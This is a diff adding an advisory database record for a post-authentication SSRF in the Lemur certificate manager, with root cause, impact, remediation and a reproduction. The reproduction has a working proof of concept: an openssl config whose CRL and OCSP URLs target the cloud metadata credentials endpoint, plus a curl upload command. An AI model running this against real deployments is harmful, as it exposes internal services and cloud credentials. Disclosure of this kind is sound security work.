@@ -1,0 +1,83 @@
+{
+  "id": "PYSEC-2026-2586",
+  "modified": "2026-07-13T16:32:02.487758586Z",
+  "published": "2026-07-13T15:46:24.197470Z",
+  "aliases": [
+    "CVE-2026-55162",
+    "GHSA-54vg-pfh7-jq95"
+  ],
+  "summary": "Lemur: Crafted CRL/OCSP URLs in uploaded certificates lead to post-authentication SSRF",
+  "details": "## Summary\n \nWhen verifying an uploaded certificate, `lemur/certificates/verify.py` extracts the CRL Distribution Point URL and the OCSP responder URL directly from the certificate's extensions and issues outbound requests to those URLs without scheme restriction or destination allow-listing. An authenticated user holding the operator role (required by `StrictRolePermission` on `POST /certificates/upload`) can craft a certificate whose extensions point at internal services - instance metadata endpoints, internal Kubernetes API servers, RFC1918 hosts, link-local addresses - and cause the Lemur host to issue requests against those destinations during verification.\n \n## Root Cause\n \n`lemur/certificates/verify.py`, `crl_verify`:\n \n```python\npoint = p.full_name[0].value                          # URL from CDP extension of uploaded cert\n...\nresponse = requests.get(point, timeout=(3.05, 6))     # no allow-list, no destination filter\n```\n \n`lemur/certificates/verify.py`, `ocsp_verify`:\n \n```python\ncommand = [\"openssl\", \"x509\", \"-noout\", \"-ocsp_uri\", \"-in\", cert_path]\np1 = subprocess.Popen(command, stdout=subprocess.PIPE, ...)\nurl, _ = p1.communicate()\np2 = subprocess.Popen(\n    [\"openssl\", \"ocsp\", \"-issuer\", issuer_chain_path, \"-cert\", cert_path,\n     \"-url\", url.strip()],                            # attacker-controlled URL\n    ...\n)\n```\n \nIn both code paths the URL flows from attacker-controlled certificate-extension content to a network sink with no validation against an allow-list of hostnames, no scheme restriction beyond rejecting LDAP via `InvalidSchema`, and no filtering of RFC1918 / link-local (169.254/16) / loopback / IPv6 ULA destinations.\n \n## Affected Endpoints\n \n| Method | Path | Source |\n|---|---|---|\n| POST | /api/1/certificates/upload | `verify_string` → `crl_verify` / `ocsp_verify` |\n \nThe bug additionally surfaces anywhere `verify_string` is invoked on attacker-influenced certificate content (sync paths, source plugin re-validation, etc.). The upload endpoint is the most direct trigger.\n \n## Impact\n \nAn operator-role attacker can:\n \n- Probe the Lemur host's internal network through outbound CRL/OCSP fetches and infer topology from response timings and error messages.\n- On EC2 instances without IMDSv2 enforcement, cause requests to `http://169.254.169.254/` and influence downstream behavior of components that parse the response.\n- Pin attacker-controlled CRLs into the unbounded module-level `crl_cache` dict (see Advisory 4c) for permanent cache poisoning - once cached, a poisoned CRL is served to every subsequent verification for the same URL.\nThe operator-role precondition reduces severity from what an unauthenticated SSRF would warrant, but operators are still meaningfully less trusted than the host's network position. PKI workflows also routinely process third-party certificates whose extensions are not directly controlled by the operator, broadening the trigger surface beyond purely-malicious operators.\n \n## Remediation\n \nFilter the URL before it reaches the network sink. Either:\n \n1. Maintain an explicit allow-list of CRL/OCSP hostnames in configuration (e.g., `LEMUR_TRUSTED_CRL_HOSTS` and `LEMUR_TRUSTED_OCSP_HOSTS`) and reject anything outside the list, **or**\n2. Use an SSRF-safe HTTP client wrapper that resolves the destination, rejects RFC1918 / link-local / loopback / IPv6 ULA addresses before connecting, and pins the resolved IP to defeat DNS rebinding.\nFor OCSP, route the parsed URL through the same wrapper before passing it as `-url` to `openssl ocsp`.\n \nAdditionally, bound `crl_cache` (see Advisory 4c) to prevent the SSRF vector from amplifying into a persistent cache-poisoning condition.\n \n## Steps to Reproduce\n \n1. Set up Lemur on an EC2 instance with IMDSv1 enabled (or any host with reachable RFC1918 services). Create an admin user and an operator-role user `eve`.\n2. Generate a self-signed certificate whose extensions point at internal services:\n   ```\n   cat \u003e openssl.cnf \u003c\u003cEOF\n   [req]\n   distinguished_name = req_distinguished_name\n   req_extensions = v3_ca\n   prompt = no\n \n   [req_distinguished_name]\n   CN = ssrf-poc.example\n \n   [v3_ca]\n   crlDistributionPoints = URI:http://169.254.169.254/latest/meta-data/iam/security-credentials/\n   authorityInfoAccess = OCSP;URI:http://169.254.169.254/latest/meta-data/\n   EOF\n \n   openssl req -x509 -newkey rsa:2048 -keyout ssrf.key -out ssrf.crt \\\n       -days 365 -nodes -config openssl.cnf -extensions v3_ca\n   ```\n \n3. On the Lemur host, start a packet capture filter for the target address before submitting the cert:\n   ```\n   sudo tcpdump -nni any host 169.254.169.254\n   ```\n \n4. As `eve`, upload the malicious certificate:\n   ```\n   BODY=$(cat ssrf.crt | sed ':a;N;$!ba;s/\\n/\\\\n/g')\n   curl -X POST https://lemur.local/api/1/certificates/upload \\\n        -H \"Authorization: Bearer \u003ceve_jwt\u003e\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n              \\\"name\\\": \\\"ssrf-poc\\\",\n              \\\"body\\\": \\\"$BODY\\\",\n              \\\"chain\\\": \\\"\\\",\n              \\\"private_key\\\": \\\"\\\",\n              \\\"owner\\\": \\\"eve@example.com\\\"\n            }\"\n   ```\n \n5. Observe the outbound request to `169.254.169.254` in the tcpdump output. The request originates from the Lemur process during `verify_string` processing of the uploaded cert. The attacker has successfully induced a server-side request to an internal address of their choosing.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lemur",
+        "purl": "pkg:pypi/lemur"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.9.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.11.0",
+        "0.2.1",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "1.0.0",
+        "1.1.0",
+        "1.2.0",
+        "1.3.1",
+        "1.3.2",
+        "1.4.0",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.8.2",
+        "1.9.0",
+        "1.9.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/lemur/PYSEC-2026-2586.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Netflix/lemur/security/advisories/GHSA-54vg-pfh7-jq95"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Netflix/lemur"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Netflix/lemur/releases/tag/v1.9.2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/lemur"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-54vg-pfh7-jq95"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55162"
+    }
+  ]
+}
